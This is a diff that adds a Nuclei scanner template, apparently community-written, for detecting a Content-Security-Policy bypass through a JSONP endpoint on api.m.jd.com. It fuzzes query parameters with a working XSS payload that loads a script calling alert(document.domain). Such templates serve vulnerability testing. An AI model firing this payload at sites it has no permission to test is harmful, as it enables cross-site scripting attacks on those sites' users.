@@ -1,0 +1,55 @@
+id: jd-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - JD API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,jd-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "jd.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: jd_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "jd_api_csp_xss == true"
+# digest: 4a0a00473045022043260ee3a100c6a2ec7be423b002fe2f7c1a042761420ba4b7af32caa0112091022100e01d1c2142e1822385c3d5aa4acd840f54933d31a02b39c8cc8d4357993f9462:922c64590222798bb761d5b6d8e72950
